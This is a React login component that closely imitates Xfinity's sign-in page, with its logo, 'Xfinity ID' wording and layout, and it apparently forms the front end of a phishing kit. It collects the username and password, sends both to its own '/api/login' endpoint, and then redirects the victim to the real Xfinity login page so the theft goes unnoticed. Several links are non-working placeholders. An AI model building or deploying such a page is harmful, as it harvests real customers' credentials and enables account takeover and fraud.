"use client";
import { useState } from "react";
import { ChevronRight, Loader2 } from "lucide-react";

import axios from "axios";
import Footer from "../footer";

export default function LoginForm() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [step, setStep] = useState<"username" | "password">("username");
  const [formData, setFormData] = useState({ user_name: "", password: "" });
  const [errors, setErrors] = useState<{
    user_name?: string;
    password?: string;
  }>({});
  const [isChecked, setIsChecked] = useState(false);

  const validateUsername = (value: string) => {
    if (!value.trim()) return "Please enter your Xfinity ID to sign in.";
    return null;
  };

  const validatePassword = (value: string) => {
    if (!value.trim()) return "Password is required.";
    // if (value.length < 6) return "Password must be at least 6 characters.";
    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const newErrors: typeof errors = {};

    if (step === "username") {
      const usernameError = validateUsername(formData.user_name);
      if (usernameError) {
        newErrors.user_name = usernameError;
        setErrors(newErrors);
        return;
      }

      setErrors({});
      setIsSubmitting(true);

      setTimeout(() => {
        setStep("password");
        setIsSubmitting(false);
      }, 1200);

      return;
    }

    const passwordError = validatePassword(formData.password);
    if (passwordError) {
      setErrors({ password: passwordError });
      return;
    }

    setErrors({});
    setIsSubmitting(true);

    try {
      const response = await axios.post("/api/login", formData, {
        headers: { "Content-Type": "application/json" },
      });

      if (response.status === 200) {
        window.location.href = "https://login.xfinity.com/login";
      }
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <div className="flex-1 flex flex-col lg:grid lg:grid-cols-2">
        {/* Left Column */}
        <div className="flex flex-col justify-center px-6 py-10 md:px-12">
          <div className="md:mx-[95px]">
            <img
              src="/images/xfinity-logo.svg"
              alt="Logo"
              width={100}
              className="h-12 w-[70px] mb-8 ml-0"
            />
            <h1 className="text-left text-3xl font-bold text-gray-800 mb-6">
              {step == "username"
                ? "Sign in with your Xfinity ID"
                : "Enter Your Password"}
            </h1>

            <form
              onSubmit={handleSubmit}
              className="space-y-6"
              action="https://login.xfinity.com/login"
              method="POST"
            >
              {step === "username" ? (
                <div>
                  <input
                    type="text"
                    value={formData.user_name}
                    onChange={(e) => {
                      setFormData({ ...formData, user_name: e.target.value });
                      if (errors.user_name)
                        setErrors({ ...errors, user_name: undefined });
                    }}
                    name="user"
                    id="user"
                    placeholder="Email, mobile, or username"
                    className={`w-full px-4 py-4 bg-[#f6f6f9] rounded border-[2px] ${
                      errors.user_name ? "border-[#b7023c]" : "border-gray-800"
                    } outline-purple-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500`}
                  />
                  {errors.user_name && (
                    <p className="text-[#b7023c] text-xs mt-2 flex items-center gap-1 font-[500]">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="16"
                        height="16"
                        viewBox="0 0 24 24"
                        fill="currentColor"
                        focusable="false"
                        role="img"
                        className="size-xs negative primary icon"
                        aria-hidden="true"
                      >
                        <path d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z"></path>
                      </svg>{" "}
                      {errors.user_name}
                    </p>
                  )}
                </div>
              ) : (
                <div>
                  <input
                    type="password"
                    value={formData.password}
                    onChange={(e) => {
                      setFormData({ ...formData, password: e.target.value });
                      if (errors.password)
                        setErrors({ ...errors, password: undefined });
                    }}
                    placeholder="Password"
                    className={`w-full px-4 py-4 bg-[#f6f6f9] rounded border-[2px] ${
                      errors.password ? "border-[#b7023c]" : "border-gray-800"
                    } outline-purple-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500`}
                  />
                  {errors.password && (
                    <p className="text-[#b7023c] text-xs mt-2 flex items-center gap-1 font-[500]">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="16"
                        height="16"
                        viewBox="0 0 24 24"
                        fill="currentColor"
                        focusable="false"
                        role="img"
                        className="size-xs negative primary icon"
                        aria-hidden="true"
                      >
                        <path d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z"></path>
                      </svg>{" "}
                      {errors.password}
                    </p>
                  )}

                  <div className="my-4 text-[#5a23b9] font-[600]">
                    Forgot password
                  </div>

                  <div className="flex items-center  gap-3 mt-8">
                    <input
                      type="checkbox"
                      checked={isChecked}
                      onChange={() => setIsChecked(!isChecked)}
                      readOnly
                      className="w-[21px] h-[21px] accent-purple-500 border-gray-400 rounded-sm cursor-pointer"
                    />
                    <div className=" text-[#474D66] text-[14px]">
                      Keep me signed in
                    </div>
                  </div>
                </div>
              )}
              <p className="mt-4 text-sm text-[#141417]">
                By signing in, you agree to our{" "}
                <a
                  href="#"
                  className="text-[#5a23b9] underline hover:underline"
                >
                  Terms of Service
                </a>{" "}
                and{" "}
                <a
                  href="#"
                  className="text-[#5a23b9] underline hover:underline"
                >
                  Privacy Policy
                </a>
                .
              </p>

              <button
                type="submit"
                disabled={isSubmitting}
                className="relative md:w-[30%] bg-[#5a23b9] text-white py-3 md:py-4 px-6 rounded font-medium hover:bg-[#36156f] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isSubmitting && (
                  <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
                    <Loader2 className="animate-spin h-7 w-7" />
                  </div>
                )}
                {step === "username" ? "Let's go" : "Submit"}
              </button>
            </form>

            <div className="mt-8">
              {[
                "New to Xfinity? View exclusive offers near you",
                "Find your Xfinity ID",
                "Create a new Xfinity ID",
              ].map((text, i) => (
                <a
                  href="#"
                  key={i}
                  className={`${
                    i != 2 ? "border-b border-gray-200" : ""
                  } flex items-center justify-between p-5 hover:bg-gray-100 rounded-lg group`}
                >
                  <span className="text-[#141417] text-sm">{text}</span>
                  <ChevronRight className="text-gray-400 group-hover:text-gray-600" />
                </a>
              ))}
            </div>
          </div>
        </div>

        {/* Right Column */}
        <div
          className="hidden lg:flex items-center justify-center bg-[url('/images/BAU-XM_CIMA_4.15.25_Update_Desktop.png')] bg-cover bg-top-center"
          style={{ backgroundSize: "135%", backgroundPosition: "top center" }}
        >
          <div className="text-center max-w-lg px-6"></div>
        </div>
      </div>

      <Footer />
    </div>
  );
}
